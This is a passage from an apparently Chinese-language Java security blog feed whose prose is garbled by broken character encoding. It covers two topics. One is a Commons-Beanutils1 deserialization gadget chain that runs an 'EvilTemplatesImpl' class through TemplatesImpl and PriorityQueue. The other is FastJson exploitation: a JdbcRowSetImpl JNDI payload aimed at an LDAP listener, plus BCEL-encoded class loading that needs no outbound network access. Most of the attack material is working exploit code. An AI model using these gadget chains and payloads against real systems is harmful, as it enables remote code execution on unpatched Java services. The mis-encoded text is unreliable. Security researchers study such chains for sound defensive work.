class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513089.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è€Œ <code>TemplatesImpl#newTransformer()</code>  çš„ä¸Šä¸€å±‚è°ƒç”¨æ–¹æ³• <code>getOutputProperties()</code>  æ˜¯ <code>get</code>  å¼€å¤´ï¼Œç¬¦åˆ <code>getter</code> <br> å®šä¹‰</p><p>å¯¹<a href="https://blog.csdn.net/m0_52367015/article/details/126101980?spm=1001.2014.3001.5501"> TemplatesImpl</a> å¿˜è®°æµç¨‹çš„å¯ä»¥çœ‹ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ki10MOc;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//TemplatesImpléƒ¨åˆ†</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\Code\\JavaSecurityCode\\CommonsBeanutils1\\target\\classes\\evil\\EvilTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,</span><br><span class="line">                comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//setFieldValueåˆ©ç”¨åå°„ç»™ç§æœ‰å˜é‡èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513162.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="çœæµ"><a class="markdownIt-Anchor" href="#çœæµ">#</a> çœæµ</h2><p>å¦‚æœä½ äº†è§£ <code>TemplatesImpl</code>  å’Œ <code>CC2</code>  çš„æµç¨‹<br>å‰é¢çš„å°±éƒ½ä¸ç”¨çœ‹äº†<br>åªéœ€è¦çŸ¥é“åœ¨ <code>TemplatesImpl</code>  ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>æœ€å¼€å§‹çš„æ–¹æ³• <code>getOutputProperties</code>  æ˜¯ä»¥ <code>get</code>  å¼€å¤´ï¼Œ<br>è€Œåœ¨ <code>JavaBean</code>  ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒåŒ…å«ä¸€ä¸ªç§æœ‰å±æ€§ nameï¼Œå’Œè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆç§°ä¸º getter å’Œ setterã€‚å…¶ä¸­ï¼Œgetter<br> çš„æ–¹æ³•åä»¥ get å¼€å¤´å³ <code>getter</code>  æ–¹æ³•</p><p>commons-beanutils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• PropertyUtils.getProperty ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»<br>æ„ JavaBean çš„ getter æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸¤è€…ç»“åˆèµ·æ¥å³å°† <code>property</code>  çš„å€¼ä¸º  <code>outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty( o1, outputProperties);</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è§¦å‘åé¢çš„ä»»æ„ä»£ç äº†</p><p>å†™æ³•æ²¡æœ‰ä»€ä¹ˆå¥‡ç‰¹çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;apache-commons-beanutils&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#apache-commons-beanutils&quot;&gt;#&lt;/a&gt; Apache Commons Beanutils&lt;/h2&gt;
&lt;p&gt;Apach</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJsonä¸å‡ºç½‘åˆ©ç”¨</title>
    <link href="https://ki10moc.github.io/2022/11/14/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    <id>https://ki10moc.github.io/2022/11/14/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</id>
    <published>2022-11-13T17:28:36.000Z</published>
    <updated>2023-07-10T02:03:50.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æµ…æfastjsonä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼-butiannet"><a class="markdownIt-Anchor" href="#æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æµ…æfastjsonä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼-butiannet">#</a> æœ¬æ–‡é¦–å‘äº [å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº](<a href="https://forum.butian.net/share/2040">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº - æµ…æ FastJson ä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼ (butian.net)</a>)</h4><h2 id="0x01-jndiåˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x01-jndiåˆ©ç”¨">#</a> 0x01 JNDI åˆ©ç”¨</h2><p>JdbcRowSetImpl ä¸­å­˜åœ¨çš„ JNDI æ³¨å…¥</p><p><img src="https://img-blog.csdnimg.cn/93eaa2726d884ec6a5b8dfb72e59a49a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œè€ƒè™‘ setAutoCommit</p><p><img src="https://img-blog.csdnimg.cn/4b9c50f76fe841879af122aaa18b491d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ˜¯ä¸ª set æ–¹æ³•</p><p>å‚æ•°æ˜¯å¸ƒå°”ç±»å‹çš„</p><p><img src="https://img-blog.csdnimg.cn/331bf53417bb42e2a852350d9642db16.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨ Yakit ç”Ÿæˆä¸€ä¸ªåè¿</p><p><img src="https://img-blog.csdnimg.cn/38b219d420654f538eb772a7cb5d9d9b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ„é€  EXP</p><p>é¦–å…ˆç±»åæ˜¯ <code>com.sun.rowset.JdbcRowSetImpl</code>  ä¹Ÿå°±æ˜¯ <code>@type</code>  çš„å€¼</p><p>æ¥ç€æ˜¯ <code>.lookup</code>  çš„å‚æ•° <code>DataSourceName</code>  ä¹Ÿå°±æ˜¯ rmi æˆ– ldap çš„åœ°å€</p><p>æœ€åæ˜¯ <code>AutoCommit</code>  å¸ƒå°”å‹çš„å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZhALlpnN\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/888b395807634ba88d2f329ff055a537.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯è¿™ç§åˆ©ç”¨æ–¹å¼æ˜¯éœ€è¦å‡ºç½‘çš„ï¼Œå¹¶ä¸”æœ‰ç‰ˆæœ¬ã€ä¾èµ–é™åˆ¶</p><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸ªå¯ä»¥æœ¬åœ°åˆ©ç”¨çš„</p><h2 id="0x02-ä¸å‡ºç½‘åˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x02-ä¸å‡ºç½‘åˆ©ç”¨">#</a> 0x02 ä¸å‡ºç½‘åˆ©ç”¨</h2><p>fastjsonâ‰¤1.2.24</p><p>æ¡ä»¶: <code>BasicDataSource</code>  åªéœ€è¦æœ‰ <code>dbcp</code>  æˆ– <code>tomcat-dbcp</code>  çš„ä¾èµ–å³å¯ï¼Œdbcp å³æ•°æ®åº“è¿æ¥æ± ï¼Œåœ¨ java ä¸­ç”¨äºç®¡ç†æ•°æ®åº“è¿æ¥ï¼Œè¿˜æ˜¯æŒºå¸¸è§çš„ã€‚</p><p>åœ¨ <code>ClassLoader</code>  å­˜åœ¨ä¸€å¤„ <code>loadclass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å½“ç±»åæ˜¯ä»¥ <code>$$BCEL$$</code>  å¼€å¤´ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªè¯¥ç±»ï¼Œå¹¶ç”¨ definclass å»è°ƒç”¨</p><p>BCEL æä¾›ä¸¤ä¸ªç±»ï¼Œ <code>Repository</code>  å’Œ <code>Utility</code></p><p><code>Repository</code>  ç”¨äºå°†ä¸€ä¸ª <code>Java Class</code>  å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ javac å‘½ä»¤æ¥ç¼–è¯‘ java æ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç </p><p><code>Utility</code>  ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆ BCEL æ ¼å¼çš„å­—èŠ‚ç </p><p>å…¶ä¸­ <code>createClass</code>  æ–¹æ³•ä¸­</p><p><img src="https://img-blog.csdnimg.cn/2dbcf13ac47149a0ab2a58d224e30927.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ‰ä¸€å¤„è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ å¯†ä¸€ä¸‹</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kiloã€å†°å®¤/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span> + encode, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        <span class="comment">//        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + encode).newInstance();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-åˆ©ç”¨é“¾"><a class="markdownIt-Anchor" href="#0x03-åˆ©ç”¨é“¾">#</a> 0x03 åˆ©ç”¨é“¾</h2><p>è¿™æ¬¡æˆ‘ä»¬å°è¯•ä»¥æ¼æ´å‘ç°è€…çš„èº«ä»½æ¥çœ‹è¿™æ¡é“¾å­</p><p>é¦–å…ˆæ˜¯ <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot load JDBC driver class &#x27;&quot;</span> + driverClassName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                    logWriter.println(message);</span><br><span class="line">                    t.printStackTrace(logWriter);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (driverFromCCL == <span class="literal">null</span>) &#123;</span><br><span class="line">                    driverToUse = DriverManager.getDriver(url);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Usage of DriverManager is not possible, as it does not</span></span><br><span class="line">                    <span class="comment">// respect the ContextClassLoader</span></span><br><span class="line">                    <span class="comment">// N.B. This cast may cause ClassCastException which is handled below</span></span><br><span class="line">                    driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();</span><br><span class="line">                    <span class="keyword">if</span> (!driverToUse.acceptsURL(url)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;No suitable driver&quot;</span>, <span class="string">&quot;08001&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot create JDBC driver of class &#x27;&quot;</span></span><br><span class="line">                        + (driverClassName != <span class="literal">null</span> ? driverClassName : <span class="string">&quot;&quot;</span>) + <span class="string">&quot;&#x27; for connect URL &#x27;&quot;</span> + url + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                logWriter.println(message);</span><br><span class="line">                t.printStackTrace(logWriter);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">            